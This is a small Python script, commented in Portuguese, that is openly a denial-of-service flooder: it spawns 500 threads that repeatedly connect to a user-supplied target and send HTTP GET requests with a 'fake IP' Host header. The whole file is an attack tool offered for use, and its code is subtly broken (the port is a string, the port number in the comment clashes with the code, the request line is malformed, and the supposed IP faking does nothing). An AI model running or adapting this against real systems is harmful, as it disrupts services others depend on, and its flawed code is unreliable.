import threading
import socket

target = "IP ou Domínio"
#Inserir a porta que deseja atacar, para HTTP e conexão com a internet a porta 80,
#ou 22 para a porta de SSH para atacar conexões de servidores e dispositivos
port = "80 or 20"
#inserir o "FAKE" IP que deseja (Não garante anonimidade)
fake_ip = "IP fake"

already_connect = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP1.1\r\n").encode("ascii"), (target, port))
        s.sendto(("HOST: " + fake_ip + "\r\n\r\n").encode("ascii"), (target, port))
        s.close()

        global already_connect
        already_connect += 1
        print(already_connect)

#Definir quantos threads você quer enviar por segundo para o DDOS
for i in range(500):
    thread = threading.Thread (target=attack)
    thread.start()